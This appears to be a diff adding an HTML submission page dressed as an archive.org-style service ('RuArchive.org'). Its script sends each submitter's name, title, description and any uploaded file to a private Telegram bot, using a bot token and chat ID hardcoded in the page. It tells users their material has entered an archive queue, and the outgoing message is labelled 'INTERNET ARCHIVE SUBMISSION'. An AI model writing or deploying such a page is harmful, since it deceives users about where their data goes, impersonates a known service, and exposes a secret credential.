@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Archive Submission | Отправить в архив</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #e8e2cf url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.1"><path fill="none" stroke="%2380664a" stroke-width="0.5" d="M10,10 L90,10 M10,20 L90,20 M10,30 L90,30 M10,40 L90,40 M10,50 L90,50 M10,60 L90,60 M10,70 L90,70 M10,80 L90,80 M10,90 L90,90 M20,10 L20,90 M30,10 L30,90 M40,10 L40,90 M50,10 L50,90 M60,10 L60,90 M70,10 L70,90 M80,10 L80,90"/></svg>');
+            font-family: 'Georgia', 'Times New Roman', 'Palatino', serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+        }
+
+        /* Винтажный контейнер */
+        .archive-container {
+            max-width: 750px;
+            width: 100%;
+            background: #fffef7;
+            border: 1px solid #c4b99a;
+            box-shadow: 12px 12px 24px rgba(0,0,0,0.1);
+            position: relative;
+        }
+
+        /* Верхняя полоска как на archive.org */
+        .archive-header {
+            background: #2c2b28;
+            padding: 8px 20px;
+            border-bottom: 3px solid #ff9900;
+        }
+
+        .archive-header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .archive-logo {
+            font-family: monospace;
+            font-size: 14px;
+            color: #ffcc66;
+            letter-spacing: 1px;
+        }
+
+        .archive-logo span {
+            color: #ff9900;
+            font-weight: bold;
+        }
+
+        .archive-tagline {
+            font-size: 11px;
+            color: #aaa68c;
+            font-family: monospace;
+        }
+
+        /* Основное содержимое */
+        .archive-main {
+            padding: 30px 35px 35px 35px;
+        }
+
+        /* Заголовок в стиле Internet Archive */
+        .archive-title {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #e0d6bb;
+            padding-bottom: 20px;
+        }
+
+        .archive-title h1 {
+            font-size: 32px;
+            font-weight: normal;
+            letter-spacing: -0.5px;
+            color: #2c2b28;
+            font-family: 'Georgia', serif;
+        }
+
+        .archive-title h1 img {
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+
+        .archive-title .sub {
+            font-size: 13px;
+            color: #8b7a5c;
+            margin-top: 8px;
+            font-family: monospace;
+        }
+
+        /* Форма в стиле archive.org */
+        .archive-form {
+            margin-top: 10px;
+        }
+
+        .form-row {
+            margin-bottom: 22px;
+        }
+
+        .form-label {
+            display: block;
+            font-weight: bold;
+            font-size: 14px;
+            color: #3a3524;
+            margin-bottom: 8px;
+            font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
+            letter-spacing: 0.3px;
+        }
+
+        .form-label .required {
+            color: #c93a1e;
+            font-weight: bold;
+        }
+
+        .form-label .optional {
+            color: #8b7a5c;
+            font-weight: normal;
+            font-size: 11px;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 10px 14px;
+            background: #fffffc;
+            border: 1px solid #c4bc9c;
+            font-family: 'Segoe UI', 'Helvetica Neue', monospace;
+            font-size: 14px;
+            transition: all 0.2s;
+            color: #2c2b28;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #ff9900;
+            box-shadow: 0 0 0 2px rgba(255,153,0,0.2);
+            background: #fffef5;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 110px;
+        }
+
+        /* Стиль для файла */
+        .file-wrapper {
+            background: #f7f4e8;
+            border: 1px solid #dcd2ba;
+            padding: 12px;
+            position: relative;
+        }
+
+        input[type="file"] {
+            padding: 8px;
+            background: transparent;
+            border: none;
+            font-size: 13px;
+        }
+
+        .file-info {
+            font-size: 11px;
+            color: #7f6e4a;
+            margin-top: 8px;
+            padding-left: 8px;
+        }
+
+        .file-preview {
+            margin-top: 10px;
+            padding: 8px;
+            background: #e7e0ce;
+            font-size: 12px;
+            color: #4a6a2e;
+            display: none;
+            font-family: monospace;
+        }
+
+        /* Кнопка в стиле archive.org */
+        .submit-btn {
+            background: #f0e6d2;
+            border: 2px solid #b8a87a;
+            padding: 14px 28px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #4a3e28;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Georgia', serif;
+            letter-spacing: 1px;
+            transition: all 0.2s;
+            margin-top: 15px;
+        }
+
+        .submit-btn:hover {
+            background: #ffefcf;
+            border-color: #ff9900;
+            color: #2c2b28;
+            transform: scale(0.98);
+        }
+
+        /* Сообщения */
+        .message {
+            margin-top: 20px;
+            padding: 14px;
+            text-align: center;
+            font-family: monospace;
+            font-size: 13px;
+            display: none;
+            border-left: 4px solid;
+        }
+
+        .message.success {
+            background: #e0e8cf;
+            border-left-color: #6b8c42;
+            color: #2c4a1e;
+        }
+
+        .message.error {
+            background: #f5e0dc;
+            border-left-color: #c93a1e;
+            color: #8b2a12;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            padding: 12px;
+            background: #f4efdf;
+            font-family: monospace;
+        }
+
+        .loading span {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #b8a87a;
+            border-top-color: #ff9900;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        progress {
+            width: 100%;
+            height: 8px;
+            margin-top: 12px;
+            display: none;
+            accent-color: #ff9900;
+        }
+
+        /* Футер как в архиве */
+        .archive-footer {
+            background: #f0e8da;
+            border-top: 1px solid #ddd0b0;
+            padding: 15px 35px;
+            font-size: 11px;
+            color: #6e5d3a;
+            text-align: center;
+            font-family: monospace;
+        }
+
+        .archive-footer a {
+            color: #8b6b3a;
+            text-decoration: none;
+            border-bottom: 1px dotted;
+        }
+
+        .archive-footer a:hover {
+            color: #c93a1e;
+        }
+
+        @media (max-width: 600px) {
+            .archive-main {
+                padding: 20px;
+            }
+            .archive-title h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="archive-container">
+        <div class="archive-header">
+            <div class="archive-header-content">
+                <div class="archive-logo">
+                    📀 <span>RuArchive.org</span> / SUBMIT
+                </div>
+                <div class="archive-tagline">
+                    universal access to human knowledge
+                </div>
+            </div>
+        </div>
+
+        <div class="archive-main">
+            <div class="archive-title">
+                <h1>📚 SUBMIT TO ARCHIVE</h1>
+                <div class="sub">create a new projekts!</div>
+            </div>
+
+            <form id="archiveForm" class="archive-form">
+                <div class="form-row">
+                    <label class="form-label">
+                        <span class="required">✧</span> NAME / CREATOR
+                    </label>
+                    <input type="text" id="name" required placeholder="e.g., Ivan Petrov, Archive User">
+                </div>
+
+                <div class="form-row">
+                    <label class="form-label">
+                        <span class="required">✧</span> TITLE
+                    </label>
+                    <input type="text" id="title" required placeholder="Title of the submission">
+                </div>
+
+                <div class="form-row">
+                    <label class="form-label">
+                        <span class="required">✧</span> DESCRIPTION
+                    </label>
+                    <textarea id="description" required placeholder="Describe the content, context, or significance..."></textarea>
+                </div>
+
+                <div class="form-row">
+                    <label class="form-label">
+                        <span class="optional">📎</span> FILE ATTACHMENT
+                        <span class="optional">(up to 50 MB)</span>
+                    </label>
+                    <div class="file-wrapper">
+                        <input type="file" id="file" accept="*/*">
+                        <div class="file-info">accepted formats: any • max 50 MB</div>
+                        <div class="file-preview" id="filePreview"></div>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn">⟶ SEND TO ARCHIVE ⟵</button>
+            </form>
+
+            <div class="loading" id="loading">
+                <span></span> transmitting to digital archive...
+            </div>
+            <progress id="progress" value="0" max="100"></progress>
+            <div class="message" id="message"></div>
+        </div>
+
+        <div class="archive-footer">
+            RuArchive 2026 <a href="#" onclick="return false;">about this collection</a>
+        </div>
+    </div>
+
+    <script>
+        // TELEGRAM CONFIGURATION
+        const BOT_TOKEN = "8560122712:AAECNGDt9ZnIF7J95NAZNg1G_8zfthVb_lk";
+        const CHAT_ID = "6566652857";
+
+        const form = document.getElementById('archiveForm');
+        const loading = document.getElementById('loading');
+        const progressBar = document.getElementById('progress');
+        const messageDiv = document.getElementById('message');
+        const fileInput = document.getElementById('file');
+        const filePreview = document.getElementById('filePreview');
+
+        // File preview
+        fileInput.addEventListener('change', function() {
+            if (this.files.length > 0) {
+                const file = this.files[0];
+                const sizeMB = (file.size / (1024 * 1024)).toFixed(2);
+                if (file.size > 50 * 1024 * 1024) {
+                    filePreview.style.color = '#aa4a2a';
+                    filePreview.innerHTML = `⚠️ FILE TOO LARGE: ${file.name} (${sizeMB} MB) — max 50 MB`;
+                    filePreview.style.display = 'block';
+                } else {
+                    filePreview.style.color = '#4a6a2e';
+                    filePreview.innerHTML = `✓ selected: ${file.name} (${sizeMB} MB)`;
+                    filePreview.style.display = 'block';
+                }
+            } else {
+                filePreview.style.display = 'none';
+            }
+        });
+
+        // Helper: escape HTML
+        function escapeHtml(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        // Show message
+        function showMessage(text, type) {
+            messageDiv.textContent = text;
+            messageDiv.className = `message ${type}`;
+            messageDiv.style.display = 'block';
+            setTimeout(() => {
+                messageDiv.style.display = 'none';
+            }, 6000);
+        }
+
+        // Update progress
+        function updateProgress(percent) {
+            progressBar.value = percent;
+            progressBar.style.display = 'block';
+            if (percent >= 100) {
+                setTimeout(() => {
+                    progressBar.style.display = 'none';
+                }, 1000);
+            }
+        }
+
+        // Send to Telegram
+        async function sendToTelegram(text, file = null) {
+            if (file) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', file);
+                formData.append('caption', text.substring(0, 1024));
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return await res.json();
+            } else {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return await res.json();
+            }
+        }
+
+        // Form submission
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const name = document.getElementById('name').value.trim();
+            const title = document.getElementById('title').value.trim();
+            const description = document.getElementById('description').value.trim();
+            const file = fileInput.files[0];
+
+            if (!name || !title || !description) {
+                showMessage('❌ Please fill all required fields: Name, Title, Description.', 'error');
+                return;
+            }
+
+            if (file && file.size > 50 * 1024 * 1024) {
+                showMessage('❌ File exceeds 50 MB limit. Please select a smaller file.', 'error');
+                return;
+            }
+
+            const timestamp = new Date().toLocaleString('en-US', { hour12: false });
+            let msg = `📀 <b>INTERNET ARCHIVE SUBMISSION</b>\n\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `👤 <b>Name:</b> ${escapeHtml(name)}\n`;
+            msg += `📌 <b>Title:</b> ${escapeHtml(title)}\n`;
+            msg += `📝 <b>Description:</b>\n${escapeHtml(description)}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🕒 <b>Timestamp:</b> ${timestamp}\n`;
+            if (file) {
+                const sizeMB = (file.size / (1024 * 1024)).toFixed(2);
+                msg += `📎 <b>File:</b> ${escapeHtml(file.name)} (${sizeMB} MB)\n`;
+            } else {
+                msg += `📎 <b>File:</b> none\n`;
+            }
+            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌐 archive.org preservation queue`;
+
+            loading.style.display = 'block';
+            messageDiv.style.display = 'none';
+            updateProgress(30);
+
+            try {
+                let result;
+                if (file) {
+                    updateProgress(50);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('document', file);
+                    formData.append('caption', msg.substring(0, 1024));
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    result = await res.json();
+                    if (result.ok && msg.length > 1024) {
+                        await sendToTelegram(msg);
+                    }
+                } else {
+                    updateProgress(70);
+                    result = await sendToTelegram(msg);
+                }
+                updateProgress(100);
+
+                if (result.ok) {
+                    showMessage('✓ SUBMISSION ACCEPTED. Your materials are now in the digital archive queue.', 'success');
+                    form.reset();
+                    filePreview.style.display = 'none';
+                } else {
+                    console.error('Telegram error', result);
+                    showMessage('✖ Transmission failed: ' + (result.description || 'unknown error'), 'error');
+                }
+            } catch (err) {
+                console.error(err);
+                showMessage('✖ Network error: ' + err.message, 'error');
+            } finally {
+                loading.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
